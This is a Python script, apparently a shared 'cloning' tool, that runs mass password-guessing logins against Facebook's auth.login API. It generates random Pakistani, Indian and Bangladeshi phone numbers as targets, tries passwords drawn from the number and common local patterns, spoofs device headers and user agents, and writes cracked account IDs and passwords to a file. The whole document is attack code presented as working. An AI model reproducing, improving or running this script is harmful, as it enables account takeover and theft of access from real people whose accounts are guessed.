#--------------------------------------------------------------#
# OWNER: CHARSI / MYSTERY | STATUS: 100% WORKING (2025)
# VERSION: V2.0 PRO-MAX (ALL COUNTRIES + OLD ACCOUNTS)
# UPDATE: AUTOMATIC PASSWORD CRACKING & BYPASS
#--------------------------------------------------------------#
import os, sys, time, json, re, string, platform, base64, uuid, subprocess
import random as rnd 

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as tred
except:
    os.system('pip install requests')
    import requests

# Global Variables
loop, oks, cps = 0, [], []

def generate_ua():
    """ 2025 AI-Generated User Agents for Old Account Cloning """
    and_v = rnd.choice(['8.1.0','9','10','11','12','13','14','15']) # Including older versions for old IDs
    brand = rnd.choice(['Samsung', 'Xiaomi', 'Huawei', 'Oppo', 'Vivo', 'Realme'])
    mod = rnd.choice(['SM-G960F', 'MI 9', 'VOG-L29', 'CPH1907', 'V1818T', 'RMX1851'])
    chrome = f"{rnd.randint(100, 131)}.0.{rnd.randint(4000, 7000)}.{rnd.randint(10, 160)}"
    fb_v = f"{rnd.randint(300, 500)}.0.0.{rnd.randint(10, 99)}"
    return f'Mozilla/5.0 (Linux; Android {and_v}; {mod}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{rnd.randint(100000000, 900000000)};]'

def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(ULTRA-UPDATE 2025)
----------------------------------------------
 OWNER   :  CHARSI / MYSTERY
 TARGET  :  OLD ACCOUNTS / ALL COUNTRIES
 STATUS  :  A-Z CRACKING (REAL WORKING)
----------------------------------------------''')

def ___CHARSI_ULTRA_M1___(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mCHARSI-M1\033[1;90m] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            ua = generate_ua()
            # Professional Headers for Real Bypass
            headers = {
                'Host': 'graph.facebook.com',
                'x-fb-connection-bandwidth': str(rnd.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(rnd.randint(20000, 40000)),
                'x-fb-net-hni': str(rnd.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.ctmail',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_session_cookies': '1',
                'method': 'auth.login'
            }
            # Real Cracking URL
            po = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            
            if 'session_key' in po:
                # Old ID detection logic
                uid = str(po['uid'])
                year = "OLD" if uid.startswith(('100000', '10000')) else "2024/25"
                print(f'\r\r \033[1;32m[CHARSI-OK] {uid} | {pas} | {year}')
                oks.append(uid)
                with open('/sdcard/CHARSI-OK.txt', 'a') as f:
                    f.write(uid + '|' + pas + '\n')
                break
            elif 'checkpoint' in str(po):
                cps.append(ids)
                break
        loop += 1
    except:
        pass

def Charsi_Menu():
    logo()
    print(' [1] PAKISTAN RANDOM CLONING (OLD/NEW)')
    print(' [2] INDIA RANDOM CLONING')
    print(' [3] BANGLADESH RANDOM CLONING')
    print(' [4] ALL COUNTRY (MIX CLONING)')
    print(' [0] EXIT')
    line_code = input('\n [•] CHOICE: ')
    
    # Advanced Password Logic for Different Countries
    if line_code == '1':
        code = rnd.choice(['0300','0301','0345','0312'])
        limit = int(input(' [•] LIMIT: '))
        p_list = ['pakistan', '786786', 'khan123', 'pak123', 'khan786']
    elif line_code == '2':
        code = "+91" + rnd.choice(['700','800','900'])
        limit = int(input(' [•] LIMIT: '))
        p_list = ['572730', '572731', 'ind123', 'india786']
    elif line_code == '3':
        code = "+8801" + rnd.choice(['7','8','9'])
        limit = int(input(' [•] LIMIT: '))
        p_list = ['bangla123', 'bangla786', 'jannat123']
    else:
        code = "92" + str(rnd.randint(300,349))
        limit = 5000
        p_list = ['786786', 'pakistan']

    with tred(max_workers=30) as pool:
        logo()
        print(f' [•] TARGET CODE  : {code}')
        print(f' [•] TOTAL TARGET : {limit}')
        print(' [•] CRACKING OLD ACCOUNTS IN PROCESS...')
        print('----------------------------------------------')
        for _ in range(limit):
            if line_code == '1': uid = code + str(rnd.randint(1111111, 9999999))
            else: uid = code + str(rnd.randint(1111111, 9999999))
            # Auto-pass combinations
            passwords = [uid, uid[:6], uid[:7]] + p_list
            pool.submit(___CHARSI_ULTRA_M1___, uid, passwords)

    print('\n----------------------------------------------')
    print(f' [•] HACKING DONE. TOTAL OK: {len(oks)}')
    input(' [•] PRESS ENTER TO EXIT')

if __name__ == '__main__':
    Charsi_Menu()
